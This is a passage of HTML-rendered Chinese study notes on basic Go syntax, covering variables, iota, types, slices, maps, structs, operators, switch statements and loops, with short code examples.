class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br><span class="hljs-keyword">var</span> (<br>name <span class="hljs-type">string</span> = <span class="hljs-string">&quot;ad&quot;</span><br>Int  <span class="hljs-type">int</span>    = <span class="hljs-number">9</span><br>)<br>fmt.Println(name)<br>fmt.Println(Int, name)<br><br><span class="hljs-built_in">print</span>(Int)<br>&#125;<br></code></pre></td></tr></table></figure><p>注意var()用法</p></li><li><p>变量的初始值</p><p><code>go</code>语言可以为变量默认值 </p></li><li><p>自动推导</p><p>使用<code>变量名 :=</code>不用加<code>var</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>name := <span class="hljs-string">&quot;AWda&quot;</span><br>fmt.Println(name)<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>打印类型</p><p><code>%T</code>大写</p></li><li><p>打印地址</p><p><code>%p</code>小写  </p></li><li><p><code>_</code>给这个赋任何值都应该该被抛弃</p></li></ul></li><li><p>变量交换</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a <span class="hljs-type">int</span> = <span class="hljs-number">100</span><br><span class="hljs-keyword">var</span> b <span class="hljs-type">int</span> = <span class="hljs-number">200</span><br>a, b = b, a<br>fmt.Println(a, b)<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>变量的作用域</p><ul><li>如果存在全局变量和局部变量，在函数里面优先使用局部变量</li></ul></li></ol><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><ol><li><p>使用关键字<code>const</code></p></li><li><p>也可以使用自动推导</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> d, e, c = <span class="hljs-string">&quot;string&quot;</span>, <span class="hljs-number">3.14</span>, <span class="hljs-number">520</span><br><span class="hljs-keyword">const</span> a <span class="hljs-type">int</span> =<span class="hljs-number">4</span>;<br></code></pre></td></tr></table></figure></li><li><p><code>iota</code> 常计数器</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">const</span> (<br>a = <span class="hljs-literal">iota</span><br>b<br>c<br>d = <span class="hljs-string">&quot;haha&quot;</span><br>e<br>f = <span class="hljs-number">100</span><br>g<br>h = <span class="hljs-literal">iota</span><br>i<br>)<br>fmt.Println(a, b, c, d, e, f, g, h, i)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>b&#x3D;1,c&#x3D;2</p><p>e&#x3D;haha会与上面的变量保持相同</p><p>g&#x3D;100同理</p><p>h&#x3D;7恢复计数</p><p>i&#x3D;8</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">const</span> (<br>a = <span class="hljs-literal">iota</span><br>b<br>c<br>d = <span class="hljs-string">&quot;haha&quot;</span><br>e<br>f = <span class="hljs-number">100</span><br>g<br>h = <span class="hljs-literal">iota</span><br>i<br>)<br><span class="hljs-keyword">const</span> (<br>j = <span class="hljs-literal">iota</span><br>)<br>fmt.Println(a, b, c, d, e, f, g, h, i, j)<br><br>&#125;<br><br><span class="hljs-comment">//j=0;</span><br><span class="hljs-comment">//是一组新的const</span><br></code></pre></td></tr></table></figure><p><img src="https://go-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/iota.png"></p></li></ol><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><ol><li><p><code>bool</code></p><p>默认值为<code>false</code></p><p>打印格式是<code>%t</code></p></li><li><p>整形</p><ul><li><p>有符号整型：<code>int8</code>、<code>int16</code>、<code>int32</code>、<code>int64</code> 和 <code>int</code>。</p></li><li><p>无符号整型：<code>uint8</code>、<code>uint16</code>、<code>uint32</code>、<code>uint64</code> 和 <code>uint</code>。分别表示 8 位、16 位、32 位、64 位和字节长度的无符号整数。</p></li></ul></li><li><p>浮点型</p><ul><li><p>当规定输出的小数点时，go会四舍五入</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> float <span class="hljs-type">float32</span> = <span class="hljs-number">3.14</span><br><span class="hljs-keyword">var</span> float2 <span class="hljs-type">float32</span> = <span class="hljs-number">3.19</span><br>fmt.Printf(<span class="hljs-string">&quot;%f\t%f\n&quot;</span>, float, float2)<br>fmt.Printf(<span class="hljs-string">&quot;%.1f\t%.1f&quot;</span>, float, float2)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3</span>.<span class="hljs-number">140000</span>        <span class="hljs-number">3</span>.<span class="hljs-number">190000</span><br><span class="hljs-attribute">3</span>.<span class="hljs-number">1</span>     <span class="hljs-number">3</span>.<span class="hljs-number">2</span><br><br></code></pre></td></tr></table></figure></li></ul></li><li><p>部分类型的别名</p><p><img src="https://go-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/%E9%83%A8%E5%88%86%E5%88%AB%E5%90%8D.png"></p></li><li><p>string</p><ul><li><p>使用%s打印</p></li><li><p>字符串拼接</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> str <span class="hljs-type">string</span> = <span class="hljs-string">&quot;AWDawd&quot;</span><br>fmt.Println(str+<span class="hljs-string">&quot;awd&quot;</span>)<br></code></pre></td></tr></table></figure></li></ul></li><li><p>和C一样的转义字符</p></li><li><p>数据类型的转换</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go">a := <span class="hljs-number">3</span><br>b := <span class="hljs-number">3.14</span><br>fmt.Println((<span class="hljs-type">float64</span>(a) + b))<br><span class="hljs-comment">//将a转换为float64</span><br><br><br><br>c:=<span class="hljs-type">float64</span>(<span class="hljs-type">int</span>(<span class="hljs-type">float64</span>(a)))<br><span class="hljs-built_in">println</span>(c)<br></code></pre></td></tr></table></figure><ul><li>整形，浮点型不能转成bool</li></ul></li><li><p>切片</p><ul><li><p><code>append()</code>向切片添加</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> ints []<span class="hljs-type">int</span> = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">5</span>)<br>fmt.Printf(<span class="hljs-string">&quot;before\n&quot;</span>)<br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> ints &#123;<br>fmt.Println(v)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;after&quot;</span>)<br>ints = <span class="hljs-built_in">append</span>(ints, <span class="hljs-number">2</span>)<br>ints = <span class="hljs-built_in">append</span>(ints, <span class="hljs-number">2312</span>)<br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> ints &#123;<br>fmt.Println(v)<br>&#125;<br><br>b := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">5</span>)<br><span class="hljs-built_in">copy</span>(b, ints)<br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> b &#123;<br>fmt.Println(v)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>map</p><ul><li><p>创建<br><code>a:=make(map[key]value)</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">a := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>)<br>a[<span class="hljs-string">&quot;noe&quot;</span>] = <span class="hljs-number">1</span><br>a[<span class="hljs-string">&quot;two&quot;</span>] = <span class="hljs-number">2</span><br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> a &#123;<br>fmt.Println(v)<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>读取</p><p><code>v, ifHava := a[&quot;three&quot;]</code></p><ul><li>v代表了值</li><li>ifHava 类型是bool看是否存在</li><li></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>)<br>a[<span class="hljs-string">&quot;noe&quot;</span>] = <span class="hljs-number">1</span><br>a[<span class="hljs-string">&quot;two&quot;</span>] = <span class="hljs-number">2</span><br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> a &#123;<br>fmt.Println(v)<br>&#125;<br>v, ifHava := a[<span class="hljs-string">&quot;three&quot;</span>]<br><span class="hljs-keyword">if</span> ifHava == <span class="hljs-literal">true</span> &#123;<br>fmt.Println(v)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;NO&quot;</span>)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>删除</p><p><code>delete(a, &quot;one&quot;)</code></p><p><code>a</code>是一个<code>map</code></p></li><li><p>代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := [<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;<br>sum := <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> a &#123;<br>sum += i<br>&#125;<br><br>fmt.Println(sum)<br><br>m := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-string">&quot;2&quot;</span>&#125;<br><br><span class="hljs-keyword">for</span> k, v := <span class="hljs-keyword">range</span> m &#123;<br>fmt.Println(k, v)<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>for range </p><p>前面的相当于下标，所以直接是key</p></li></ul></li></ul></li><li><p>结构体</p><ul><li><p>起别名+创建结构体</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 起别名</span><br><span class="hljs-keyword">type</span> chg <span class="hljs-type">int</span><br>      <br><span class="hljs-comment">// 定义一个结构体</span><br><span class="hljs-keyword">type</span> zjy <span class="hljs-keyword">struct</span> &#123;<br>    name <span class="hljs-type">string</span><br>    high <span class="hljs-type">float64</span><br>&#125;<br>      <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">changeZjy</span><span class="hljs-params">(test *zjy)</span></span> &#123;<br>    test.high = <span class="hljs-number">1.5</span><br>    test.name = <span class="hljs-string">&quot;zjy is big pig&quot;</span><br>&#125;<br>      <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">var</span> int1 chg = <span class="hljs-number">2</span><br>    fmt.Println(int1)<br>    fmt.Printf(<span class="hljs-string">&quot;%T\n&quot;</span>, int1)<br>      <br>    <span class="hljs-keyword">var</span> test zjy<br>    test.high = <span class="hljs-number">2.4</span><br>    test.name = <span class="hljs-string">&quot;zjy&quot;</span><br>    fmt.Println(test)<br>      <br>    changeZjy(&amp;test)<br>    fmt.Println(test)<br>&#125;<br>      <br>      <br></code></pre></td></tr></table></figure></li></ul></li><li><p>将结构体变换类</p><ul><li>注意<ul><li>记得在外挂函数的时候传指针</li><li>声明结构体，记得通过大小写来限定权限</li></ul></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>name <span class="hljs-type">string</span><br>age  <span class="hljs-type">int</span><br>high <span class="hljs-type">float64</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(this *Person)</span></span> setName(name <span class="hljs-type">string</span>) &#123;<br>this.name = name<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(this *Person)</span></span> getName() <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> this.name<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(this *Person)</span></span> Show() &#123;<br>fmt.Println(*this)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> zjy Person<br>zjy.setName(<span class="hljs-string">&quot;zjy&quot;</span>)<br>fmt.Println(zjy.getName())<br>fmt.Println(zjy.name)<br>zjy.Show()<br>zjy.age = <span class="hljs-number">20</span><br>zjy.high = <span class="hljs-number">1.5</span><br>zjy.Show()<br>fmt.Println(zjy)<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h3><ol><li>基本的都和C语言一样，下面是不一样的</li><li>自增自减只有<code>i++</code>，<code>i--</code></li></ol><h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h3><ol><li>和C语言一样</li></ol><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><ol><li>C语言一样</li></ol><h3 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h3><ol><li><p><code>&amp;</code>两个二进制数对应都为1，才为1</p><p>相当于和</p></li><li><p><code>|</code>只要有1，就为 1 </p><p>相当于或</p></li><li><p>打印二进制（b是二进制的缩写）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">fmt.Printf(<span class="hljs-string">&quot;%b&quot;</span>, b)<br></code></pre></td></tr></table></figure></li><li><p><code>^</code>不同为<code>1</code>，相同为<code>0</code>  </p></li><li><p><code>&lt;&lt; n</code>左移n位</p></li><li><p><code>&gt;&gt; n</code>右移n位</p></li></ol><h3 id="输入和输出"><a href="#输入和输出" class="headerlink" title="输入和输出"></a>输入和输出</h3><p>使用<code>fmt</code>里面的<code>scan</code>等</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go">fmt.Printf(<span class="hljs-string">&quot;input:&quot;</span>)<br><span class="hljs-keyword">var</span> a <span class="hljs-type">int</span><br><span class="hljs-keyword">var</span> b <span class="hljs-type">int</span><br><span class="hljs-keyword">var</span> str <span class="hljs-type">string</span><br>fmt.Scan(&amp;a, &amp;str, &amp;b)<br><br><span class="hljs-keyword">if</span> str == <span class="hljs-string">&quot;+&quot;</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;a+b:&quot;</span>, a+b)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> str == <span class="hljs-string">&quot;-&quot;</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;a-b:&quot;</span>, a-b)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> str == <span class="hljs-string">&quot;*&quot;</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;a*b:&quot;</span>, a*b)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> str == <span class="hljs-string">&quot;/&quot;</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;a/b:&quot;</span>, <span class="hljs-type">float64</span>(a/b))<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;input error&quot;</span>)<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="选择语句"><a href="#选择语句" class="headerlink" title="选择语句"></a>选择语句</h3><p><code>if-else</code></p><p>注意不加小括号</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> a == <span class="hljs-number">10</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;a==10&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;a=&quot;</span>, a)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>switch</code></p><p>默认op为<code>true</code></p><p><code>go</code>的<code>op</code>可以是任何数据类型</p><p><code>switch</code>没有穿透性</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">switch</span> a &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>fmt.Println(<span class="hljs-string">&quot;case 1&quot;</span>)<br><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>fmt.Println(<span class="hljs-string">&quot;case 2&quot;</span>)<br><span class="hljs-keyword">default</span>:<br>fmt.Println(<span class="hljs-string">&quot;default&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>fallthrough</code>可以提供穿透性</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">switch</span> str &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;1&quot;</span>:<br>fmt.Println(<span class="hljs-string">&quot;case 1&quot;</span>)<br><span class="hljs-keyword">fallthrough</span><br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;2&quot;</span>:<br>fmt.Println(<span class="hljs-string">&quot;case 2&quot;</span>)<br><span class="hljs-keyword">default</span>:<br>fmt.Println(<span class="hljs-string">&quot;case else&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>配合使用<code>break</code>可以跳出穿透</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go">str := <span class="hljs-string">&quot;1&quot;</span><br><span class="hljs-keyword">switch</span> str &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;1&quot;</span>:<br>fmt.Println(<span class="hljs-string">&quot;case 1&quot;</span>)<br><span class="hljs-keyword">fallthrough</span><br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;2&quot;</span>:<br><span class="hljs-keyword">if</span> str == <span class="hljs-string">&quot;1&quot;</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;case 2&quot;</span>)<br><span class="hljs-keyword">default</span>:<br>fmt.Println(<span class="hljs-string">&quot;case else&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>加强的<code>swith</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">switch</span> &#123;<br><span class="hljs-keyword">case</span> a &lt;= <span class="hljs-number">2</span>:<br>fmt.Println(<span class="hljs-string">&quot;a&lt;=2&quot;</span>)<br><span class="hljs-keyword">case</span> a &lt; <span class="hljs-number">2</span> &amp;&amp; a &gt;= <span class="hljs-number">0</span>:<br>fmt.Println(<span class="hljs-string">&quot;a&lt;2&amp;&amp;a&gt;=0&quot;</span>)<br><span class="hljs-keyword">default</span>:<br>fmt.Println(<span class="hljs-string">&quot;default&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>死循环</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span>&#123;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>加强的<code>for</code>(遍历是数组和切片)</p><p>注意<code>range</code>会返回两个值，第一个是下标，第二个是<code>value</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>str := <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; i++ &#123;<br>str += <span class="hljs-type">string</span>(<span class="hljs-string">&#x27;A&#x27;</span> + i)<br>&#125;<br>fmt.Println(str)<br><span class="hljs-keyword">for</span> i, v := <span class="hljs-keyword">range</span> str &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%d:%c  &quot;</span>, i, v)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><ol><li><p>求长度使用<code>len</code></p></li><li><p>和<code>java</code>一样<code>string</code>是不可以修改的</p></li><li><p>字符串其他操作</p><p>遍历查询string</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>str := <span class="hljs-string">&quot;awd&quot;</span><br>fmt.Println(<span class="hljs-built_in">len</span>(str))<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(str); i++ &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%c&quot;</span>, str[i])<br>&#125;<br>&#125; <br></code></pre></td></tr></table></figure></li><li><p>数组</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 